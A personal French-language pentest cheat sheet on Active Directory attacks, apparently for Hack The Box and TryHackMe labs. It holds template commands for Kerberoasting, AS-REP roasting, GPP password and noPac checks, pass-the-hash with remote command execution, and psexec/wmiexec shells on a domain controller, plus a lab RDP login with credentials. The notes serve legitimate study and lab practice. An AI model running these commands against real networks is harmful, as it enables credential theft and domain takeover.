## Bases LDAP

https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html

# Doc AD:

https://ntlm.info/
https://beta.hackndo.com/pass-the-hash/#protocole-ntlm

https://zer1t0.gitlab.io/posts/attacking_ad/

`mindmap`https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

## Réseau

https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address

```
/etc/hosts
ip DOMAIN
ip DC
```

## SMB enumeration /Kerberoasting

- `impacket` : 
	- check Kerberoasting: GetUserSPNs.py 
	- check AsRepRoasting: GetUserNPUs.py ([UAC values](https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/))


[Box Active (HTB)](https://0xdf.gitlab.io/2018/12/08/htb-active.html)

Synchroniser l'horloge:

`sudo ntpdate <ip>`

- `crackmapexec`:
	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): spider_plus): `cme smb <Domain> -u <user> -p <pass> -M gpp_password`
	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <Domain> -u <user> -p <pass> -M Maq` (max machines à créer)
	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`

## Silver/Golden Ticket

https://github.com/fortra/impacket/issues/1457

## Shell

**Domain.local/Administrator@127.0.0.1**

`psexec.py <Domain>/<user>:<pass>@<DC.local>`
`wmiexec.py <Domain>/<user>@<DC.local> -hashes ':<nthash>'`

## FreeRDP2

(TryHackMe AD Basics)

```bash
xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
```

![](./thm_rdp.png)

## Lab AD

https://github.com/WazeHell/vulnerable-AD
https://github.com/Orange-Cyberdefense/GOAD
